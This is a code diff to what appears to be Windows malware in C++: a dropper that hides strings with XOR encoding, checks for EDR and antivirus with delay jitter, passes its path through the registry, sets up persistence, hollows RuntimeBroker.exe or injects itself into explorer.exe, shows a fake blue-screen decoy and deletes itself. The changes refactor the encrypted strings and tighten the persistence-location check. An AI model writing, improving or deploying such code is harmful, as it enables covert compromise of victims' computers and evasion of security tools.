@@ -18,10 +18,11 @@
 
 namespace {
     // XOR Encrypted Strings (Key 0x5A)
-    std::wstring kExplorer = L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F";
-    std::wstring kSvchost = L"\x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F";
-    std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x36\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";
-    std::wstring kDropperPath = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";
+    const wchar_t kExplorerEnc[] = { 0x3F, 0x22, 0x2A, 0x36, 0x35, 0x28, 0x3F, 0x28, 0x74, 0x3F, 0x22, 0x3F }; // explorer.exe
+    const wchar_t kSvchostEnc[] = { 0x29, 0x2C, 0x39, 0x32, 0x35, 0x28, 0x2E, 0x74, 0x3F, 0x22, 0x3F }; // svchost.exe
+    const wchar_t kVolatileEnvEnc[] = { 0x0C, 0x35, 0x36, 0x3B, 0x2E, 0x33, 0x36, 0x3F, 0x7A, 0x1F, 0x34, 0x2C, 0x33, 0x28, 0x35, 0x34, 0x37, 0x3F, 0x34, 0x2E }; // Volatile Environment
+    const wchar_t kDropperPathEnc[] = { 0x1E, 0x28, 0x35, 0x2A, 0x2A, 0x3F, 0x28, 0x0A, 0x3B, 0x2E, 0x32 }; // DropperPath
+    const wchar_t kRuntimeBrokerEnc[] = { 0x08, 0x2F, 0x34, 0x2E, 0x33, 0x37, 0x3F, 0x18, 0x28, 0x35, 0x31, 0x3F, 0x28, 0x74, 0x3F, 0x22, 0x3F }; // RuntimeBroker.exe
 
     std::vector<uint8_t> GetSelfImage() {
         wchar_t path[MAX_PATH];
@@ -38,13 +39,14 @@ namespace {
     }
 
     bool IsSystemProcess(const std::wstring& sPath) {
-        if (sPath.find(utils::DecryptW(kExplorer)) != std::wstring::npos) return true;
-        if (sPath.find(utils::DecryptW(kSvchost)) != std::wstring::npos) return true;
+        if (sPath.find(utils::DecryptW(kExplorerEnc, 12)) != std::wstring::npos) return true;
+        if (sPath.find(utils::DecryptW(kSvchostEnc, 11)) != std::wstring::npos) return true;
         return false;
     }
 
     bool IsRunningFromPersistLocation(const std::wstring& sPath) {
-        if (sPath.find(L"\\appdata\\local\\") != std::wstring::npos || sPath.find(L"\\appdata\\roaming\\") != std::wstring::npos || sPath.find(L"\\programdata\\") != std::wstring::npos) {
+        if (sPath.find(L"\\appdata\\local\\microsoft\\") != std::wstring::npos ||
+            sPath.find(L"\\programdata\\microsoft\\") != std::wstring::npos) {
             if (sPath.find(L"\\temp\\") == std::wstring::npos && sPath.find(L"\\tmp\\") == std::wstring::npos) {
                 return true;
             }
@@ -65,6 +67,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     for (auto& c : currentPath) c = (wchar_t)::towlower(c);
 
     LOG_INFO("--- WINMAIN ---");
+    LOG_INFO("Process: " + utils::ws2s(currentPath));
 
     // EDR/AV Detection and Delay
     int jitter = evasion::Detection::GetJitterDelay();
@@ -82,9 +85,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         LOG_INFO("ROLE: Foothold.");
         wchar_t dropperPath[MAX_PATH] = {0};
         HKEY hKey;
-        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
+        std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             DWORD sz = sizeof(dropperPath);
-            if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
+            if (RegQueryValueExW(hKey, dropPathKey.c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                 LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
                 Sleep(30000);
                 persistence::establishPersistence(dropperPath);
@@ -111,8 +116,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // Dropper Instance
     LOG_INFO("ROLE: Dropper.");
     HKEY hKey;
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        if (RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
+    std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
+    std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        if (RegSetValueExW(hKey, dropPathKey.c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
              LOG_INFO("IPC: Stored path successfully.");
         }
         RegCloseKey(hKey);
@@ -123,7 +130,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         LOG_INFO("Attempting stealth relocation...");
         wchar_t systemPath[MAX_PATH];
         GetSystemDirectoryW(systemPath, MAX_PATH);
-        std::wstring rb = utils::DecryptW(L"\x08\x2F\x34\x2E\x33\x37\x3F\x18\x28\x35\x31\x3F\x28\x74\x3F\x22\x3F");
+        std::wstring rb = utils::DecryptW(kRuntimeBrokerEnc, 17);
         std::wstring target = std::wstring(systemPath) + L"\\" + rb;
 
         LOG_INFO("Hollowing target: " + utils::ws2s(target));
@@ -137,8 +144,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
         LOG_WARN("Hollowing failed. Trying explorer.exe injection...");
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
-            LOG_INFO("Injection success.");
+            LOG_INFO("Injection success. Waiting for foothold...");
             decoy::ShowBSOD();
+            LOG_INFO("Decoy exit. Cleaning up dropper.");
             CoUninitialize();
             utils::SelfDeleteAndExit();
             return 0;
